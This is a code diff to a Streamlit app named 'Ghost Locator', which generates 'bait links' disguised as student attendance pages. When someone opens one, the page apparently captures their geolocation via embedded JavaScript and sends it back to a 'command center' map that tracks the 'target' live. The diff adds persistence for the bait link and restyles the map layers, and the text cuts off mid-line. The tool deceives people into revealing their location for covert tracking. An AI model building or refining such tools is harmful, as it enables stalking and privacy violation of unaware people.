@@ -35,13 +35,18 @@ st.markdown("""
         background: #1a1c23;
         box-shadow: 0 0 20px #00f2ff;
     }
+    .stButton>button {
+        background: linear-gradient(45deg, #ff00ff, #00f2ff);
+        color: white;
+        font-weight: bold;
+    }
     </style>
     """, unsafe_allow_html=True)
 
 # --- Handling Data from Student (URL Params) ---
 query_params = st.query_params
 
-# CHECK: If student is opening the link
+# CHECK: If student is opening the link (Bait Mode)
 if query_params.get("mode") == "attendance":
     st.markdown("<br><br>", unsafe_allow_html=True)
     st.markdown("""
@@ -51,7 +56,6 @@ if query_params.get("mode") == "attendance":
         </div>
     """, unsafe_allow_html=True)
     
-    # JavaScript to get location and redirect back with coordinates
     js_code = """
     <script>
     function getLocation() {
@@ -71,12 +75,12 @@ if query_params.get("mode") == "attendance":
     </script>
     """
     st.components.v1.html(js_code, height=0)
-    st.info("⌛ Locating satellite connection... Please stay on this page.")
+    st.info("⌛ Connecting to GPS Satellite... Please wait.")
     st.stop()
 
-# --- MAIN DASHBOARD LOGIC ---
+# --- MAIN DASHBOARD LOGIC (For You) ---
 
-# Auto Refresh every 5 seconds
+# Auto Refresh every 5 seconds (Fixed to keep data stable)
 st_autorefresh(interval=5000, key="loc_refresh")
 
 # Fetch Coordinates from URL
@@ -86,85 +90,68 @@ target_id = query_params.get("id", "STU-NONE")
 
 st.title("🛰️ GHOST LOCATOR: COMMAND CENTER")
 
-# Sidebar
+# --- Sidebar Connection Panel (Fixed Memory) ---
 st.sidebar.header("📡 CONNECTION PANEL")
 st.sidebar.markdown(f"**Target ID:** `{target_id}`")
 
-# Bait Link Generator
+# Session State to keep the link visible after refresh
+if 'bait_link' not in st.session_state:
+    st.session_state.bait_link = ""
+
 if st.sidebar.button("Generate New Bait Link"):
-    # Note: Replace with your actual deployed URL
+    # APNE APP KA REAL URL YAHAN DALNA (e.g. https://xyz.streamlit.app)
     base_url = "https://your-app-name.streamlit.app" 
-    bait_link = f"{base_url}/?mode=attendance&id=STU_{random.randint(100,999)}"
-    st.sidebar.code(bait_link)
+    new_id = f"STU_{random.randint(100,999)}"
+    st.session_state.bait_link = f"{base_url}/?mode=attendance&id={new_id}"
+
+if st.session_state.bait_link:
+    st.sidebar.success("Link Active (Safe from Refresh)")
+    st.sidebar.code(st.session_state.bait_link)
 
 st.sidebar.markdown("---")
-st.sidebar.info("💡 Map ke upar right side mein 'Layer Icon' se mode badlein (Traffic, Satellite, etc.)")
+st.sidebar.info("💡 Map layers (Traffic/Satellite) upar right corner se control karein.")
 
-# Layout
+# --- Dashboard Layout ---
 col1, col2 = st.columns([1, 2.5])
 
 with col1:
     st.markdown("### 📊 Live Telemetry")
     st.metric("Latitude", f"{current_lat} N")
     st.metric("Longitude", f"{current_lon} E")
-    st.metric("Signal Status", "CONNECTED" if "lat" in query_params else "AWAITING")
-    st.metric("Last Update", datetime.datetime.now().strftime("%H:%M:%S"))
+    st.metric("Signal Status", "CONNECTED ✅" if "lat" in query_params else "AWAITING 📡")
+    st.metric("Last Seen", datetime.datetime.now().strftime("%H:%M:%S"))
     
     if "lat" in query_params:
         st.success(f"✅ Target {target_id} is LIVE")
     else:
-        st.warning("📡 Waiting for Student data...")
+        st.warning("Waiting for data packet...")
 
 with col2:
-    # 1. Base Map setup (Default Dark)
+    # Map Initialization
     m = folium.Map(location=[current_lat, current_lon], zoom_start=16, tiles=None)
 
-    # 2. Adding Different Map Layers
-    folium.TileLayer('cartodbpositron', name='Normal Road View').add_to(m)
-    folium.TileLayer('cartodbdarkmatter', name='Dark Mode (Default)').add_to(m)
+    # --- MAP LAYERS ---
+    folium.TileLayer('cartodbdarkmatter', name='Ghost Dark Mode').add_to(m)
+    folium.TileLayer('openstreetmap', name='Normal Street View').add_to(m)
     
-    # Satellite Layer (Google)
-    folium.TileLayer(
-        tiles='https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}',
-        attr='Google',
-        name='Google Satellite',
-        overlay=False,
-        control=True
-    ).add_to(m)
-
-    # Hybrid Satellite with Labels
+    # Satellite View
     folium.TileLayer(
         tiles='https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}',
         attr='Google',
-        name='Satellite with Labels',
+        name='Google Hybrid (Satellite)',
         overlay=False,
         control=True
     ).add_to(m)
 
-    # 3. Traffic Layer (Overlay)
+    # Traffic Overlay
     folium.TileLayer(
         tiles='https://mt1.google.com/vt/lyrs=h,traffic&x={x}&y={y}&z={z}',
         attr='Google Traffic',
-        name='Live Traffic Mode',
+        name='Live Traffic (Overlay)',
         overlay=True,
         control=True
     ).add_to(m)
 
-    # Pulse Marker for Target
+    # Live Target Marker
     folium.CircleMarker(
-        location=[current_lat, current_lon],
-        radius=12,
-        color="#00f2ff",
-        fill=True,
-        fill_color="#00f2ff",
-        fill_opacity=0.8,
-        tooltip="Target Location"
-    ).add_to(m)
-
-    # Add Layer Control to switch modes
-    folium.LayerControl(collapsed=False).add_to(m)
-    
-    # Display Map
-    st_folium(m, width="100%", height=600, use_container_width=True)
-
-st.markdown("<hr><center>Ghost Dashboard v4.0 | Multi-Layer Navigation Active</center>", unsafe_allow_html=True)
+        location=[current_
